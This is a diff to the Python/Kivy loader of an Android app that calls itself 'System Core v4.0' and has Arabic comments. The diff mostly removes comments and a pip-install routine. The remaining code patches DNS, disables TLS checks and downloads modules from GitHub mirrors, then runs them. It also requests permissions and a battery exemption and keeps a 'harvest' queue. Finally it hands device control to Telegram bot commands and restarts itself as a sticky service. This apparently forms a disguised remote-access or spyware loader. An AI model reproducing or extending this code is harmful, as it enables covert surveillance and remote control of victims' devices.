@@ -10,7 +10,6 @@ import time
 import socket
 import random
 import hashlib
-import subprocess
 from datetime import datetime
 from kivy.app import App
 from kivy.uix.textinput import TextInput
@@ -22,7 +21,7 @@ from kivy.core.clipboard import Clipboard
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ========== 1. تجاوز DNS (Patch) مع عناوين إضافية ==========
+# ========== 1. تجاوز DNS (Patch) ==========
 def _patch_dns():
     original_getaddrinfo = socket.getaddrinfo
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
@@ -47,7 +46,7 @@ def _patch_dns():
 
 _patch_dns()
 
-# ========== 2. روابط index.json (مرايا متعددة + Mirror Fallback) ==========
+# ========== 2. روابط index.json ==========
 INDEX_URLS = [
     "https://zaen1993.github.io/Android-Core/index.json",
     "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json",
@@ -62,7 +61,7 @@ HEADERS = {
     'Cache-Control': 'no-cache'
 }
 
-# ========== 3. المسارات الأساسية والمجلدات المخفية ==========
+# ========== 3. المسارات والمجلدات ==========
 def _get_path():
     try:
         from jnius import autoclass
@@ -84,7 +83,7 @@ os.makedirs(HARVEST_QUEUE, exist_ok=True)
 if R not in sys.path:
     sys.path.insert(0, R)
 
-# ========== 4. الأذونات + تجاوز تحسين البطارية ==========
+# ========== 4. الأذونات ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -122,31 +121,7 @@ def _perms():
     except Exception as e:
         print(f"Battery exemption error: {e}")
 
-# ========== 5. تثبيت المكتبات المفقودة ديناميكياً (للـ AI) ==========
-def _install_pip_packages():
-    """محاولة تثبيت numpy و tflite-runtime في خلفية منفصلة (لا تؤثر على التشغيل الأساسي)"""
-    try:
-        # التحقق مما إذا كانت numpy مثبتة
-        import numpy
-    except ImportError:
-        try:
-            print("[AI] Installing numpy...")
-            subprocess.run([sys.executable, '-m', 'pip', 'install', 'numpy==1.26.4'],
-                           capture_output=True, check=False)
-        except Exception as e:
-            print(f"[AI] Failed to install numpy: {e}")
-
-    try:
-        import tflite_runtime
-    except ImportError:
-        try:
-            print("[AI] Installing tflite-runtime...")
-            subprocess.run([sys.executable, '-m', 'pip', 'install', 'tflite-runtime==2.14.0'],
-                           capture_output=True, check=False)
-        except Exception as e:
-            print(f"[AI] Failed to install tflite-runtime: {e}")
-
-# ========== 6. تطبيق Kivy الرئيسي ==========
+# ========== 5. تطبيق Kivy ==========
 class CoreApp(App):
     def build(self):
         self.title = "System Core v4.0"
@@ -191,7 +166,6 @@ class CoreApp(App):
         Clock.schedule_once(upd, 0)
 
     def _verify_module(self, file_path, module_name):
-        """التحقق من صحة الملف (عدم فساد أو اختفاء)"""
         if not os.path.exists(file_path):
             return False
         try:
@@ -206,7 +180,6 @@ class CoreApp(App):
             return False
 
     def _download_safe(self, url, filename):
-        """تحميل ملف مع تجربة مرايا متعددة، وفحص محتوى أساسي"""
         tmp_path = os.path.join(U, filename)
         final_path = os.path.join(R, filename)
 
@@ -257,19 +230,15 @@ class CoreApp(App):
         _perms()
         self._log("🚀 Ultra Secure Core (Anti-Block Mode) starting...", "BOOT")
 
-        # بدء تثبيت المكتبات المفقودة في الخلفية (لعدم إبطاء التشغيل)
-        threading.Thread(target=_install_pip_packages, daemon=True).start()
-
-        # --- 1. جلب index.json (مع مرايا) ---
+        # --- 1. جلب index.json ---
         all_files = []
-        index_data = None
         for idx_url in INDEX_URLS:
             try:
                 self._log(f"Trying index: {idx_url.split('/')[2]}...")
                 resp = requests.get(idx_url, headers=HEADERS, timeout=15, verify=False)
                 if resp.status_code == 200:
-                    index_data = resp.json()
-                    all_files = index_data.get('files', [])
+                    data = resp.json()
+                    all_files = data.get('files', [])
                     self._log(f"📄 Found {len(all_files)} files from {idx_url.split('/')[2]}")
                     break
                 else:
@@ -279,16 +248,16 @@ class CoreApp(App):
         else:
             self._log("⚠️ Could not fetch index.json. Using cached files if any.", "WARN")
 
-        # --- 2. تحميل الملفات (باستثناء main.py) ---
+        # --- 2. تحميل الملفات ---
         for file_url in all_files:
             filename = file_url.split('/')[-1]
             if filename == "main.py":
                 continue
             self._download_safe(file_url, filename)
 
-        time.sleep(1)   # استقرار القرص
+        time.sleep(1)
 
-        # --- 3. تنظيف الموديولات القديمة من الذاكرة ---
+        # --- 3. تنظيف الموديولات القديمة ---
         self._log("🧹 Cleaning memory...")
         modules_to_remove = [
             "monitor", "telegram_ui", "commands",
@@ -301,7 +270,7 @@ class CoreApp(App):
         importlib.invalidate_caches()
         gc.collect()
 
-        # --- 4. تحميل الأسرار من config.py (يتم إنشاؤه أثناء البناء) ---
+        # --- 4. تحميل الأسرار من config.py ---
         try:
             import config
             importlib.reload(config)
@@ -309,7 +278,6 @@ class CoreApp(App):
             self._log("🔐 Configuration loaded securely.")
         except Exception as e:
             self._log(f"❌ Failed to load config: {e}", "ERROR")
-            # لا يمكن الاستمرار بدون أسرار
             return
 
         # --- 5. التأكد من وجود telegram_ui.py ---
@@ -318,13 +286,12 @@ class CoreApp(App):
             self._log("❌ telegram_ui.py not found. Please check internet connection and retry.", "ERROR")
             return
 
-        # --- 6. إقلاع النظام الأساسي ---
+        # --- 6. إقلاع النظام ---
         try:
             import monitor
             import telegram_ui
             import commands
 
-            # إعادة تحميل لضمان أحدث نسخة تم تحميلها
             importlib.reload(monitor)
             importlib.reload(telegram_ui)
             importlib.reload(commands)
@@ -332,11 +299,9 @@ class CoreApp(App):
             UI_Class = getattr(telegram_ui, 'T', None)
             if UI_Class:
                 mon = monitor.M()
-                # ربط الجهاز بـ "بوت قائد" ثابت باستخدام random.seed
                 random.seed(mon.did)
                 self._log(f"🆔 Device ID: {mon.did[:8]}... | Cluster seed set")
 
-                # إنشاء واجهة Telegram مع تمرير الأسرار
                 ui = UI_Class(
                     m=mon,
                     active_tokens=active_tokens,
@@ -346,7 +311,6 @@ class CoreApp(App):
                     app_password=secret_password
                 )
                 mon.ui = ui
-                # ربط أوامر الـ callback مع commands.ex
                 mon.cb_h = lambda cmd, cid, cbq: commands.ex(cmd, ui, mon, cid, cbq)
 
                 ui.start()
@@ -359,10 +323,8 @@ class CoreApp(App):
         except Exception as e:
             self._log(f"FATAL ERROR: {e}", "ERROR")
             self._log(traceback.format_exc(), "TRACE")
-            # محاولة إعادة تشغيل الخدمة بعد 60 ثانية في حالة فشل كارثي
             Clock.schedule_once(lambda dt: self._start(None), 60)
 
-    # ========== دالتا الحفاظ على الخدمة (Sticky Service) ==========
     def on_pause(self):
         return True
 
